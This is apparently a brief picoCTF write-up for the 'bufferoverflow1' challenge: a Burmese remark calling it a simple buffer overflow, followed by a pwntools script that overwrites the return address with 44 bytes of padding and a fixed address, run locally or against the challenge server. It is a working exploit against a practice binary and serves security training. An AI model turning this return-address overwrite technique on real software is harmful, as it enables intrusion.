

#### bufferoverflow1

လွယ်တယ် ရိုးရိုး bufferoverflowလေးဘဲ

```python
from pwn import *

context.log_level = 'info'
context.binary = "./vuln"
elf = context.binary
libc = elf.libc

def start():
    if args.R:
        return remote("saturn.picoctf.net", 58089)
    elif args.G:
        return gdb.debug(elf.path, gdbscript='''
            break main
        ''')
    else:
        return process(elf.path)

def exploit(p):
    payload = b"a" * 44
    payload += p32(0x080491f6)
    p.recvline(b"your string:")
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    io = start()
    exploit(io)
```